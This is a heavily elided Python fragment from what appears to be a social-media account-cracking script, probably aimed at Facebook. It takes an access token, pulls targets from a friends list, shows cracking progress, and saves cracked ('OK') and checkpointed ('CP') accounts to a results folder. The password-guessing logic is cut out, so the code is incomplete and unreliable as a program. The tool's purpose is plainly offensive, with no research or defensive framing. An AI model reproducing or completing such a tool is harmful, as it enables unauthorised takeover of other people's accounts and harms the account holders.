	...
	if ask =="":
		...
		if ask =="":
			...
			try:
				...
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results OK Date : %s-%s-%s"%(ha, op, ta(totalok)))
			...
			try:
				...
				print(" "+N+"[#]------------------------------------------") 
				print(" "+N+"[+] Results CP Date : %s-%s-%s"%(ha, op, ta(totalcp)))
...
def indo():
	...
	try:
		...
		print(' '+N+' [!] Token Invalid')
		tokenz()
	print("\n "+N+"[+] Type 'me' to Crack From Friends List")
	...
	def main(user):
		...
		sys.stdout.write(
		      '\r'+N+'[%s] Cracking %s/%s OK-:%s - CP-:%s ' % (rgb,loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid,name=user.split("|")
		try:
			os.mkdir('results')
